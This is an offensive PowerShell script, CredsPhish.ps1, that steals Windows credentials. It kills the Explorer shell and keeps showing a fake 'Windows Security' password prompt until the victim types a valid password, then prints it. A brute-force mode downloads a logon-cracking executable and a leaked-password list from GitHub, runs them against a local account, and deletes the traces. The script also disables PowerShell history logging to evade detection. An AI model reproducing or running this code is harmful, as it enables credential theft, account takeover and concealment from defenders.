<#
.SYNOPSIS
   Promp the current user for a valid credential.

   Author: @mubix|@r00t-3xp10it
   Tested Under: Windows 10 (18363) x64 bits
   Required Dependencies: none
   Optional Dependencies: BitsTransfer
   PS cmdlet Dev version: v1.1.6

.DESCRIPTION
   This CmdLet interrupts EXPLORER process until a valid credential is entered
   correctly in Windows PromptForCredential MsgBox, only them it starts EXPLORER
   process and leaks the credentials on this terminal shell (Social Engineering).

.NOTES
   Remark: This cmdlet no longer checks creds againts DC (does not validate then)

.Parameter PhishCreds
   Accepts arguments: Start and Brute (default: Start)

.Parameter Dicionary
   The absolucte path of the dicionary to use (default: $Env:TMP\passwords.txt)

.EXAMPLE
   PS C:\> .\CredsPhish.ps1
   Prompt the current user for a valid credential.

.EXAMPLE
   PS C:\> .\CredsPhish.ps1 -PhishCreds Brute
   Brute Force User account password using default dicionary

.EXAMPLE
   PS C:\> .\CredsPhish.ps1 -PhishCreds Brute -Dicionary "$Env:TMP\passwd.txt"
   Brute force User account password using attackers -Dicionary [ path ] text file

.OUTPUTS
   UserName Domain Password
   -------- ------ --------
   pedro    SKYNET ujhho
#>


## Non-Positional cmdlet named parameters
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$UserAccount=$([Environment]::UserName),
   [string]$Dicionary="$Env:TMP\passw.txt",
   [string]$PhishCreds="Start"
)


$account = $null
$PCName = $Env:COMPUTERNAME
$ErrorActionPreference = "SilentlyContinue"
#Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$Working_directory = $pwd|Select-Object -ExpandProperty path


If($PhishCreds -ieq "Start")
{

   <#
   .SYNOPSIS
      Helper - Promp the current user for a valid credential.

   .DESCRIPTION
      This CmdLet interrupts EXPLORER process until a valid credential is entered
      correctly in Windows PromptForCredential MsgBox, only them it starts EXPLORER
      process and leaks the credentials on this terminal shell (Social Engineering).

   .EXAMPLE
      PS C:\> powershell -File CredsPhish.ps1
      Prompt the current user for a valid credential.

   .EXAMPLE
      PS C:\> powershell -File CredsPhish.ps1 -Limmit 30
      Prompt the current user for a valid credential and
      Abort phishing after -Limmit [number] fail attempts.

   .OUTPUTS
      UserName Domain Password
      -------- ------ --------
      pedro    SKYNET trrst
   #>

   Write-Host "`n[+] Prompt the current user for a valid credential." -ForeGroundColor Green
   taskkill /f /im explorer.exe;Write-Host ""
   $cred = ($Host.ui.PromptForCredential("WindowsSecurity", "Please enter user credentials", "$env:userdomain\$env:username",""))
   $username = "$env:username"
   $domain = "$env:userdomain"
   $full = "$domain" + "\" + "$username"
   $password = $cred.GetNetworkCredential().password
   Add-Type -assemblyname System.DirectoryServices.AccountManagement
   $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
   while($DS.ValidateCredentials("$full", "$password") -ne $True){
       $cred = $Host.ui.PromptForCredential("Windows Security", "Invalid Credentials, Please try again", "$env:userdomain\$env:username","")
       $username = "$env:username"
       $domain = "$env:userdomain"
       $full = "$domain" + "\" + "$username"
       $password = $cred.GetNetworkCredential().password
       Add-Type -assemblyname System.DirectoryServices.AccountManagement
       $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
       $DS.ValidateCredentials("$full", "$password") | out-null
       }
     
     $output = $cred.GetNetworkCredential() | select-object UserName, Domain, Password
     $output

     Start-Process -FilePath $Env:WINDIR\explorer.exe
}
ElseIf($PhishCreds -ieq "Brute")
{

    <#
    .SYNOPSIS
       Helper - Brute Force User Account Password (LogOn)
   
    .Parameter Dicionary
       Accepts the absoluct \ relative path of dicionary.txt       

    .EXAMPLE
       PS C:\> powershell -File CredsPhish.ps1 -PhishCreds Brute
       Brute Force User account password using @redpill default dicionary

    .EXAMPLE
       PS C:\> powershell -File CredsPhish.ps1 -PhishCreds Brute -Dicionary "$Env:TMP\passwords.txt"
       Brute Force User account password using attacker own dicionary text file

    .EXAMPLE
       PS C:\> powershell -File CredsPhish.ps1 -PhishCreds Brute -Dicionary "$Env:TMP\passwords.txt" -UserAccount testme
       Brute Force 'testme' user account password using attacker own dicionary text file

    .OUTPUTS
       Brute Force [ pedro ] account
       -----------------------------
       DEBUG: trying password [0]: toor
       DEBUG: trying password [1]: pedro
       DEBUG: trying password [2]: s3cr3t
       DEBUG: trying password [3]: qwerty
       DEBUG: login success @(pedro=>qwerty)

       Attempt StartTime EndTime  Account Password
       ------- --------- -------  ------- --------
       3       18:26:43  18:27:11 pedro   qwerty
    #>

    ## Make sure all dependencies are meet
    If(-not(Test-Path -Path "$Env:TMP\WinBruteLogon.zip")){
        iwr -uri https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/WinBruteLogon.zip -OutFile $Env:TMP\WinBruteLogon.zip -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
    } 
    If(-not(Test-Path -Path "$Dicionary")){## Download dicionary text file from my github
        iwr -uri https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou-75.txt -OutFile $Dicionary -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
    }
    
    ## De-Compile zip file
    Expand-Archive "$Env:TMP\WinBruteLogon.zip" -DestinationPath "$Env:TMP" -Force

    ## Execute the auxiliary module
    Write-Host "";cd $Env:TMP
    .\WinBruteLogon.exe -v -u $UserAccount -w $Dicionary
    Write-Host "";cd $Working_directory

    ## Clean ALL artifacts left behind
    Remove-Item -Path "$Dicionary" -Force -EA SilentlyContinue
    Remove-Item -Path "$Env:TMP\WinBruteLogon.exe" -Force -EA SilentlyContinue
    Remove-Item -Path "$Env:TMP\WinBruteLogon.zip" -Force -EA SilentlyContinue
    exit ## Exit @CredsPhish
}